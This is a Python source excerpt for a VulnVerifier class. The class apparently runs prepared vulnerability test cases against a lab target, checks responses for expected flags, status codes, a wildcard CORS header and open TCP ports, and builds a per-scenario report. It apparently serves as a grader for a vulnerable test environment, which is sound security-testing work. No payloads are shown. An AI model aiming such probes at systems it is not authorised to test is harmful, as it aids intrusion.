# VulnVerifier
# ═══════════════════════════════════════════════════════════════════════


class VulnVerifier:
    """Execute vulnerability test cases and produce a verification report."""

    def __init__(self, base_url: str = "http://localhost:80", priv_url: str | None = None):
        self.base_url = base_url.rstrip("/")
        self.priv_url = priv_url.rstrip("/") if priv_url else None
        self.test_cases = _build_test_cases(self.base_url, self.priv_url)

    def run_all(self) -> VulnReport:
        """Run all test cases and return a verification report."""
        results: list[VulnTestResult] = []
        for tc in self.test_cases:
            result = self._run_test(tc)
            results.append(result)

        # Aggregate by scenario
        scenario_stats: dict = defaultdict(lambda: {"total": 0, "verified": 0, "failed": 0, "skipped": 0})
        for r in results:
            stats = scenario_stats[r.scenario_id]
            stats["total"] += 1
            if r.verified:
                stats["verified"] += 1
            else:
                stats["failed"] += 1

        # Convert defaultdict to regular dict with scenario name
        scenarios = {}
        for sid, stats in sorted(scenario_stats.items()):
            # Find scenario name from first result with this scenario_id
            sname = sid
            for r in results:
                if r.scenario_id == sid:
                    sname = r.scenario_name
                    break
            scenarios[sid] = {
                "scenario_name": sname,
                "total": stats["total"],
                "verified": stats["verified"],
                "failed": stats["failed"],
                "skipped": stats["skipped"],
                "rate": round(stats["verified"] / stats["total"], 4) if stats["total"] > 0 else 0.0,
            }

        total = len(results)
        verified = sum(1 for r in results if r.verified)
        failed = sum(1 for r in results if not r.verified)
        skipped = 0

        return VulnReport(
            total=total,
            verified=verified,
            failed=failed,
            skipped=skipped,
            scenarios=scenarios,
            results=results,
        )

    def _run_test(self, tc: VulnTestCase) -> VulnTestResult:
        """Run a single test case."""
        if tc.method == "TCP":
            return self._run_tcp_test(tc)

        effective_base = tc.alternate_url or self.base_url
        url = f"{effective_base}{tc.path}"
        headers = dict(tc.headers)
        if "Host" not in headers:
            headers["Host"] = tc.host

        content_type = tc.content_type or (
            "application/json" if tc.body and tc.method in ("POST", "PUT", "PATCH") else None
        )
        if content_type and "Content-Type" not in headers:
            headers["Content-Type"] = content_type

        body_bytes = tc.body.encode("utf-8") if tc.body else None

        # Use follow_redirects field to decide request method (unified logic)
        if not tc.follow_redirects:
            status, raw_body, resp_headers = _http_request_no_redirect(
                tc.method, url, headers, body_bytes, timeout=10,
            )
        else:
            status, raw_body, resp_headers = _http_request(
                tc.method, url, headers, body_bytes, timeout=10,
            )

        error = resp_headers.get("_error")

        # Check expected status
        status_match = True
        if tc.expected_status is not None:
            status_match = (status == tc.expected_status)

        # Check for flags in response
        matched_flags: list[str] = []
        missing_flags: list[str] = []
        for flag in tc.expected_flags:
            if flag in raw_body or flag in str(resp_headers):
                matched_flags.append(flag)
            else:
                missing_flags.append(flag)

        # For CORS test, check response headers
        if tc.id == "M9":
            cors_header = resp_headers.get("Access-Control-Allow-Origin", "")
            if cors_header == "*":
                if "Access-Control-Allow-Origin" not in matched_flags:
                    matched_flags.append("Access-Control-Allow-Origin")
                if "Access-Control-Allow-Origin" in missing_flags:
                    missing_flags.remove("Access-Control-Allow-Origin")
            else:
                if "Access-Control-Allow-Origin" not in missing_flags:
                    missing_flags.append("Access-Control-Allow-Origin")

        verified = len(missing_flags) == 0 and status_match and error is None

        # If error occurred but we still matched some flags, note it
        if error and matched_flags:
            verified = False

        return VulnTestResult(
            test_id=tc.id,
            name=tc.name,
            scenario_id=tc.scenario_id,
            scenario_name=tc.scenario_name,
            verified=verified,
            status_code=status if status > 0 else None,
            response_snippet=raw_body[:500] if raw_body else "",
            error=error,
            matched_flags=matched_flags,
            missing_flags=missing_flags,
            severity=tc.severity,
        )

    def _run_tcp_test(self, tc: VulnTestCase) -> VulnTestResult:
        """Run a TCP connectivity test."""
        parts = tc.path.split(":")
        host = parts[0]
        port = int(parts[1]) if len(parts) > 1 else 80

        is_open = _tcp_check(host, port, timeout=3)

        return VulnTestResult(
            test_id=tc.id,
            name=tc.name,
            scenario_id=tc.scenario_id,
            scenario_name=tc.scenario_name,
            verified=is_open,
            status_code=None,
            response_snippet=f"TCP {'OPEN' if is_open else 'CLOSED'}",
            error=None if is_open else f"TCP connection to {host}:{port} failed",
            matched_flags=["TCP_OPEN"] if is_open else [],
            missing_flags=[] if is_open else ["TCP_OPEN"],
            severity=tc.severity,
        )